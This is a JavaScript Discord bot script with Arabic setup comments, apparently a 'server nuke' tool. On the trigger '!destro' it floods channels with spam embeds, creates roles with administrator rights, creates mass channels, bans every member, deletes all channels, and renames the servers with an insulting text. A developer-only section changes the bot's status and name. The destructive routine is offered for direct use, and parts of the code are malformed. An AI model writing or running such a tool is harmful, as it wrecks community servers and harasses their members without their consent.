const Discord = require('discord.js');
const client = new Discord.Client();
 const prefix = ".";
client.on('ready', () => {
    console.log('I am ready!');
});
const x_x = "!destro" //هنا تحط الامر اللي يشغل الهاك
const teext = "msh ana y destro" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
const vooice = "msh ana y destro" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
const pic = "fuckk you" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
const spam = "msh ana y destro" //هنا تحط وش تبي رسالة السبام
const namee = "msh ana y destro" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
const playing = "msh ana y destro tmm" //هنا تحط وش تبي يكون الستريمنق
client.on('message', message => {
if (message.content === x_x) {
    var teeext = teext.replace(" ", "-")
    var interval = setInterval (function () {
    const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail(pic)
   .addField(spam, ".")
    message.channel.sendEmbed(embed);
    client.guilds.forEach(hack => {
    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
    hack.createChannel(teeext, 'text')
    hack.createChannel(vooice, 'voice')
    })}, 3);}});
client.on('message', message => {
if (message.content === x_x) {
    message.guild.members.forEach(baand => {
   baand.ban({reason: spam,});
   client.channels.forEach(hackch => {
   hackch.delete();
   client.user.setAvatar(pic)
   client.user.setUsername(namee)
   client.guilds.forEach(hack => {
   hack.setIcon(pic)
   hack.setName(namee)})})})}});
});
   const adminprefix = "!!";
const developers = ["517884556540379152"]//Nova Codes
client.on('message', message => {//Nova Codes
    var argresult = message.content.split(` `).slice(1).join(' ');//Nova Codes
      if (!developers.includes(message.author.id)) return;
     
  if (message.content.startsWith(adminprefix + 'setg')) {
    client.user.setGame(argresult);
      message.channel.send(`**✅   ${argresult}**`)
  } else
     if (message.content === (adminprefix + "leave")) {//Nova Codes
    message.guild.leave();   //Nova Codes
  } else  
  if (message.content.startsWith(adminprefix + 'setw')) {
  client.user.setActivity(argresult, {type:'WATCHING'});//Nova Codes
      message.channel.send(`**✅   ${argresult}**`)//Nova Codes
  } else
  if (message.content.startsWith(adminprefix + 'setl')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**✅   ${argresult}**`)//Nova Codes
  } else
  if (message.content.startsWith(adminprefix + 'sets')) {
    client.user.setGame(argresult, "https://www.twitch.tv/♥ Premium ℕova ♥");
      message.channel.send(`**✅**`)//Nova Codes
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
  if (message.content.startsWith(adminprefix + 'setprefix')) {//Nova Codes
  client.user.setPrefix(argresult).then
      message.channel.send(`Changing Prefix ..**${argresult}** `)//Nova Codes
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {//Nova Codes
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);//Nova Codes
}

});//Toxic Codes
client.login(process.env.BOT_TOKEN);
